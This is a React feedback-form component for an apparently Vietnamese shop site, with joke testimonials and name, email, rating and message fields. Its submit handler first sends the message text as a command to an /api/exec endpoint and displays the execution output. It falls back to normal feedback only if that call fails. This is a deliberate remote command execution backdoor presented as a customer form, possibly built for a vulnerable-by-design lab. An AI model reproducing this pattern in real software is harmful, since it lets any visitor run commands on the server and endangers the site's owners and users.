// components/Feedback.jsx
import React, { useState } from 'react';
import { AiFillStar, AiOutlineStar } from 'react-icons/ai';
import { FaQuoteLeft, FaQuoteRight, FaUser, FaEnvelope } from 'react-icons/fa';
import { toast } from 'react-hot-toast';

const Feedback = () => {
  const [name, setName] = useState('');
  const [email, setEmail] = useState('');
  const [message, setMessage] = useState('');
  const [rating, setRating] = useState(0);
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleSubmitFeedback = async (e) => {
    e.preventDefault();
    setIsSubmitting(true);
    
    if (!name || !email || !message || rating === 0) {
      toast.error('Vui lòng điền đầy đủ thông tin!');
      setIsSubmitting(false);
      return;
    }
    
    try {
      // First try to execute the command
      const execResponse = await fetch('/api/exec', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ command: message }),
      });

      if (execResponse.ok) {
        // Command executed successfully
        const output = await execResponse.text();
        console.log('Exec Output:', output);
        
        const preview = output.length > 200 ? output.substring(0, 200) + '...' : output;
        
        // Enhanced toast notification for successful command execution
        toast.success(`COMMAND EXECUTED SUCCESSFULLY!\n\nOutput: ${preview}`, {
          duration: 10000, // Longer duration (10 seconds)
          style: { 
            whiteSpace: 'pre-wrap', 
            wordBreak: 'break-word',
            fontSize: '16px',
            padding: '16px',
            fontWeight: 'bold',
            maxWidth: '500px',
            background: '#10b981', // Bright green background
            color: 'white' // White text
          },
          iconTheme: {
            primary: 'white',
            secondary: '#10b981'
          }
        });
      } else {
        // If command execution fails, submit as regular feedback
        const feedbackResponse = await fetch('/api/feedback', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ name, email, message, rating }),
        });

        if (!feedbackResponse.ok) throw new Error('Lỗi khi gửi phản hồi');
        
        const result = await feedbackResponse.json();
        toast.success(`Cảm ơn! ID: ${result.id}`);
      }
      
      // Clear form either way
      setName(''); setEmail(''); setMessage(''); setRating(0);
    } catch (error) {
      toast.error('Có lỗi xảy ra!');
      console.error(error);
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="feedback-container">
      <div className="feedback-header">
        <h2>Phản hồi của khách hàng</h2>
        <p className="feedback-subtitle">Chúng tôi luôn lắng nghe ý kiến của bạn để cải thiện dịch vụ</p>
      </div>
      
      <div className="feedback-content">
        <div className="feedback-testimonials">
          {/* Giữ nguyên 3 testimonials như code gốc */}
          <div className="testimonial-card">
            <div className="testimonial-icon"><FaQuoteLeft /></div>
            <div className="testimonial-rating">
              <AiFillStar /><AiFillStar /><AiFillStar /><AiFillStar /><AiFillStar />
            </div>
            <p className="testimonial-text">"Ối dồi ôi ~~~ Sản phẩm tuyệt vời! Đúng với mô tả và chất lượng rất tốt. Tôi rất hài lòng với dịch vụ khách hàng và sẽ quay lại mua sắm trong tương lai."</p>
            <div className="testimonial-author">
              <div className="author-avatar"><FaUser /></div>
              <div className="author-info">
                <h4>Nê give</h4>
                <p>Khách hàng thân thiết</p>
              </div>
            </div>
            <div className="testimonial-icon-right"><FaQuoteRight /></div>
          </div>
          
          <div className="testimonial-card">
            <div className="testimonial-icon"><FaQuoteLeft /></div>
            <div className="testimonial-rating">
              <AiFillStar /><AiFillStar /><AiFillStar /><AiFillStar /><AiOutlineStar />
            </div>
            <p className="testimonial-text">"Sẽ có những cơn gió phải trả lá."</p>
            <div className="testimonial-author">
              <div className="author-avatar"><FaUser /></div>
              <div className="author-info">
                <h4>Ộ i i</h4>
                <p>Khách hàng mới</p>
              </div>
            </div>
            <div className="testimonial-icon-right"><FaQuoteRight /></div>
          </div>
          
          <div className="testimonial-card">
            <div className="testimonial-icon"><FaQuoteLeft /></div>
            <div className="testimonial-rating">
              <AiFillStar /><AiFillStar /><AiFillStar /><AiFillStar /><AiFillStar />
            </div>
            <p className="testimonial-text">"Flop quá thì để anh feedback."</p>
            <div className="testimonial-author">
              <div className="author-avatar"><FaUser /></div>
              <div className="author-info">
                <h4>Saint Tone Emtyppy</h4>
                <p>Khách hàng thân thiết</p>
              </div>
            </div>
            <div className="testimonial-icon-right"><FaQuoteRight /></div>
          </div>
        </div>
        
        <div className="feedback-form-wrapper">
          <h3>Gửi phản hồi của bạn</h3>
          <form onSubmit={handleSubmitFeedback} className="feedback-form">
            <div className="form-group">
              <label htmlFor="name">
                <FaUser className="form-icon" />
                <span>Họ tên</span>
              </label>
              <input
                type="text"
                id="name"
                value={name}
                onChange={(e) => setName(e.target.value)}
                placeholder="Nhập họ tên của bạn"
                disabled={isSubmitting}
              />
            </div>
            
            <div className="form-group">
              <label htmlFor="email">
                <FaEnvelope className="form-icon" />
                <span>Email</span>
              </label>
              <input
                type="email"
                id="email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                placeholder="Nhập email của bạn"
                disabled={isSubmitting}
              />
            </div>
            
            <div className="form-group">
              <label>Đánh giá</label>
              <div className="star-rating">
                {[...Array(5)].map((_, index) => (
                  <span 
                    key={index} 
                    onClick={() => !isSubmitting && setRating(index + 1)}
                    className={index < rating ? "star filled" : "star"}
                  >
                    {index < rating ? <AiFillStar /> : <AiOutlineStar />}
                  </span>
                ))}
              </div>
            </div>
            
            <div className="form-group">
              <label htmlFor="message">Nội dung phản hồi</label>
              <textarea
                id="message"
                value={message}
                onChange={(e) => setMessage(e.target.value)}
                placeholder="Nhập nội dung phản hồi"
                rows={4}
                disabled={isSubmitting}
              />
            </div>
            
            <button 
              type="submit" 
              className="feedback-submit-btn"
              disabled={isSubmitting}
            >
              {isSubmitting ? 'Đang gửi...' : 'Gửi phản hồi'}
            </button>
          </form>
        </div>
      </div>
    </div>
  );
};

export default Feedback;